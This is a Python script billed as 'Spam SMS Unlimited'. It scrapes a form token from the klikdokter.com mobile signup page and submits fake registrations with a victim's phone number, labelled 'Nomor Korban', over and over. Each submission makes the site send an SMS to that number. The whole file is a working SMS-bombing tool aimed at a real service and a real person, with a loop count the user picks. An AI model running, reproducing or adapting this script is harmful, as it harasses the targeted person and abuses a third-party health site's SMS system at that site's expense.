import requests, os, sys
from bs4 import BeautifulSoup as Tod
m = '\x1b[1;31m'
i = '\x1b[1;32m'
k = '\x1b[1;33m'
p = '\x1b[1;37m'
r = '\x1b[0m'
mp = '\x1b[1;101m'
pm = '\x1b[1;107m'
class mek:
        def __init__(self):
                self.ses=requests.Session()


        def anjeng(self, num):
               req1=self.ses.get('https://m.klikdokter.com/users/create')
               bs=Tod(req1.text,'html.parser')
               token=bs.find('input',{'name':'_token'})['value']

               kntl={
                        'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'Origin': 'https://m.klikdokter.com',
                        'Upgrade-Insecure-Requests': '1',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                        'Referer': 'https://m.klikdokter.com/users/create?back-to=',
                    }
               jembod={
                        '_token':token,
                        'full_name':'MhankBarBar',
                        'email':'Mhank@BarBar.com',
                        'phone':num,
                        'back-to':'',
                        'submit':'Daftar',
                   }

               req2=self.ses.post('https://m.klikdokter.com/users/check',headers=kntl,data=jembod)

               if "sessions/auth?user=" in req2.url:
                     print(f"{p}[{k}•{p}] Berhasil")
               else:
                     print(f"{p}[{m}-{p}] Gagal")

os.system('clear')
print(f'''

            {p}[ {m}Spam {i}SMS {p}Unlimited ]

{p}┈┈{k}▕╲{m}▂▂▂▂{k}╱▏{p}┈┈┈┈┈┈
┈┈┈{k}╲╱╭╱╲╱╲{p}┈┈┈┈┈┈
┈{k}╱▔▔┈┊▏▕▏▕{p}┈┈┈┈┈┈
{k}▕▂╱▔╳▔╲{m}▊{k}▏{m}▊{k}╱▔╲▔╲{p}┈
┈┈┈┈{k}▏▕▏▔▔▔{m}▕▋{k}▕{m}▕▋{k}▏
{p}┈┈┈┈{k}╲┈{k}╲▂▂▂▂▂▂▂╱{p}┈
┈┈┈┈{k}▕╲▂▂▂▂▂╱{p}┈┈┈┈
┈┈┈{i}╱▔╲▕{p}┈┈┈┈┈┈┈┈┈''')
while(True):
        try:
                print(f'{mp}         {pm}          {r}')
		#print('Author : Mhank BarBar ')
                num=input(f"{p}[{m}?{p}] Nomor Korban : ")
                lop=int(input(f"{p}[{m}?{p}] Total Spam : "))
                print()

                main=mek()
                for i in range(lop+1):
                            main.anjeng(num)


                lgi=input(f"\n{p}[{m}?{p}] Coba lagi ({k}Y{p}/{m}N{p}) ")
                if lgi.upper() == 'N':
                        sys.exit('GOODBYE :*')
        except ValueError:
                print(f'\nYang Bener Njerr {m}!! ')
        except (EOFError,KeyboardInterrupt):
                sys.exit(f'{p}[{m}!{p}]Exit Detected')







